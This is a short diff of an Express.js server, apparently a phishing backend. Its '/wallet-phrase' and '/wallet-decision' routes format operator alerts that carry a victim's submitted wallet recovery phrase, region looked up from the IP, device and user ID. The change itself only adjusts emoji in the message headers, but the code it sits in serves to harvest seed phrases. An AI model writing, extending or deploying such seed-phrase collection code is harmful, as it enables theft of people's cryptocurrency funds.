@@ -1866,7 +1866,7 @@ app.post("/wallet-phrase", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `💰💰💰 <b>Wallet - Phrases</b> 💰💰💰\n` +
+      `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
       `<b>📝 Phrases:</b>\n` +
       `<code>${phrase}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
@@ -1910,7 +1910,7 @@ app.post("/wallet-decision", async (req, res) => {
     const region = await detectRegion(ip);
 
     const message =
-      `💰💰💰💰 <b>Wallet - Decision</b> 💰💰💰💰\n` +
+      `💰💰💰 <b>Wallet - Decision</b> 💰💰💰\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
